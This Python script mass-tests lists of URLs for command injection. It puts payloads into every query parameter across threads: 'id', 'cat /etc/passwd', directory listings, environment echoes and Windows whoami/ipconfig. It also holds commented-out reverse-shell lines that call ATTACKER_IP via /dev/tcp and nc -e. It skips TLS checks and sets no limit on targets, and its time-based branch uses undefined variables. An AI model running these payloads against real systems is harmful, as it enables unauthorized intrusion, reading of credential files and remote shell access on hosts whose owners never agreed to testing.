#!/usr/bin/env python3

import argparse
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style, init
import concurrent.futures
import urllib3
import time
import urllib.parse

# Initialize colorama for colored output
init(autoreset=True)

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define Command Injection payloads with diverse variations
cmd_inj_payloads = [
    # Simple Command Execution
    {"payload": ";& id", "keyword": "uid="},
    {"payload": "| id", "keyword": "uid="},
    {"payload": "&& id", "keyword": "uid="},
    {"payload": "; whoami", "keyword": "root"},  # Assuming root privileges
    {"payload": "| whoami", "keyword": "root"},
    {"payload": "&& uname -a", "keyword": "Linux"},  # Common in Linux systems
    
    # Data Exfiltration Commands
    {"payload": ";& cat /etc/passwd", "keyword": "root:x:0:0:"},
    {"payload": "| cat /etc/passwd", "keyword": "root:x:0:0:"},
    {"payload": "&& cat /etc/passwd", "keyword": "root:x:0:0:"},
    
    # Reverse Shell Commands (Use with Caution)
    # {"payload": ";& bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1", "keyword": ""},  # Replace with actual IP and PORT
    # {"payload": "| nc ATTACKER_IP PORT -e /bin/bash", "keyword": ""},  # Replace with actual IP and PORT
    
    # Encoded Payloads
    {"payload": "%3B%20id", "keyword": "uid="},  # URL-encoded ; id
    {"payload": "%7C%20id", "keyword": "uid="},  # URL-encoded | id
    
    # Nested Commands
    {"payload": "; ls -la", "keyword": "total"},  # Directory listing indicator
    {"payload": "| ls -la", "keyword": "total"},
    {"payload": "&& ls -la", "keyword": "total"},
    
    # Environment Variable Exposure
    {"payload": ";& echo $HOME", "keyword": "/home"},
    {"payload": "| echo $HOME", "keyword": "/home"},
    {"payload": "&& echo $HOME", "keyword": "/home"},
    
    # Windows Specific Commands
    {"payload": "& whoami", "keyword": "NT AUTHORITY"},
    {"payload": "| whoami", "keyword": "NT AUTHORITY"},
    {"payload": "&& whoami", "keyword": "NT AUTHORITY"},
    {"payload": "& ipconfig", "keyword": "IPv4"},  # Indicator of ipconfig output
    {"payload": "| ipconfig", "keyword": "IPv4"},
    {"payload": "&& ipconfig", "keyword": "IPv4"},
]

def parse_arguments():
    parser = argparse.ArgumentParser(description="Automate Command Injection testing with payload variations.")
    parser.add_argument("-i", "--input", required=True, help="Input file with URLs")
    parser.add_argument("-o", "--output", required=True, help="Output file for vulnerable URLs")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    return parser.parse_args()

def load_urls(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}Error: Input file '{file_path}' not found.")
        exit(1)

def inject_payload(url, param, payload):
    try:
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        # Replace the parameter with the payload
        params[param] = payload
        new_query = urlencode(params, doseq=True)
        injected_url = urlunparse(parsed_url._replace(query=new_query))
        # Send the GET request
        response = requests.get(injected_url, timeout=10, verify=False, allow_redirects=True)
        return response.text, injected_url
    except requests.exceptions.RequestException as e:
        print(f"{Fore.YELLOW}Error requesting {url}: {e}")
        return "", None

def inject_payload_with_time(url, param, payload):
    try:
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        # Replace the parameter with the payload
        params[param] = payload
        new_query = urlencode(params, doseq=True)
        injected_url = urlunparse(parsed_url._replace(query=new_query))
        start_time = time.time()
        response = requests.get(injected_url, timeout=15, verify=False, allow_redirects=True)
        end_time = time.time()
        elapsed_time = end_time - start_time
        return response.text, (elapsed_time > 5), injected_url  # Threshold set to 5 seconds
    except requests.exceptions.RequestException as e:
        print(f"{Fore.YELLOW}Error requesting {url}: {e}")
        return "", False, None

def analyze_response(response_text, expected_keyword):
    if expected_keyword in response_text:
        # Find the index of the first occurrence of the keyword
        index = response_text.find(expected_keyword)
        if index == -1:
            return True, ""
        # Define the number of characters to extract before and after the keyword
        context_size = 20
        start = max(index - context_size, 0)
        end = min(index + len(expected_keyword) + context_size, len(response_text))
        context = response_text[start:end]
        return True, context
    return False, ""

def decode_payload(payload):
    try:
        return urllib.parse.unquote(payload)
    except:
        return payload

def select_payloads(url):
    # Placeholder for logic to select payloads based on the URL or detected engine
    # Currently returns all payloads
    return cmd_inj_payloads

def test_url(url):
    vulnerable = False
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    if not params:
        # No parameters to test
        print(f"{Fore.YELLOW}No parameters found in URL: {url}")
        return None

    for param in params:
        for payload_entry in select_payloads(url):
            payload = payload_entry["payload"]
            keyword = payload_entry["keyword"]

            # Determine if the payload is time-based (contains 'sleep' or 'time')
            is_time_based = False
            if "sleep" in payload.lower() or "time" in payload.lower():
                is_time_based = True

            if is_time_based:
                response_text, is_delayed, injected_url = inject_payload_with_time(url, param, payload)
                if is_delayed:
                    vulnerable = True
                    print(f"{Fore.GREEN}Vulnerable (Time-Based): {url} [Param: {param}, Payload: {payload}]")
                    if injected_url:
                        print(f"{Fore.GREEN}Injected URL: {injected_url}")
                    # Optionally, display a snippet indicating the delay
                    print(f"{Fore.GREEN}Response Time: {Fore.YELLOW}{round(end_time - start_time, 2)} seconds")
                    return url  # Stop after first vulnerability detected
            else:
                # Handle encoded payloads
                decoded_payload = decode_payload(payload)
                response_text, injected_url = inject_payload(url, param, payload)
                if not response_text:
                    continue  # Skip if no response was received
                detected, context = analyze_response(response_text, keyword)
                if detected:
                    vulnerable = True
                    print(f"{Fore.GREEN}Vulnerable: {url} [Param: {param}, Payload: {payload}]")
                    if injected_url:
                        print(f"{Fore.GREEN}Injected URL: {injected_url}")
                    if context:
                        print(f"{Fore.GREEN}Context: ...{context}...")
                    return url  # Stop after first vulnerability detected
                else:
                    continue
    if not vulnerable:
        print(f"{Fore.RED}Not Vulnerable: {url}")
    return None

def main():
    args = parse_arguments()
    urls = load_urls(args.input)
    vulnerable_urls = []

    if not urls:
        print(f"{Fore.RED}Error: No URLs found in the input file.")
        exit(1)

    print(f"{Fore.CYAN}Starting Command Injection testing with {len(urls)} URLs using {args.threads} threads...\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_url = {executor.submit(test_url, url): url for url in urls}
        for future in concurrent.futures.as_completed(future_to_url):
            result = future.result()
            if result:
                vulnerable_urls.append(result)

    # Write vulnerable URLs to output file
    if vulnerable_urls:
        try:
            with open(args.output, "w") as f:
                for vuln_url in vulnerable_urls:
                    f.write(f"{vuln_url}\n")
            print(f"\n{Fore.CYAN}Vulnerable URLs have been saved to '{args.output}'")
        except Exception as e:
            print(f"{Fore.RED}Error writing to output file '{args.output}': {e}")
    else:
        print(f"\n{Fore.CYAN}No vulnerable URLs found.")

if __name__ == "__main__":
    main()
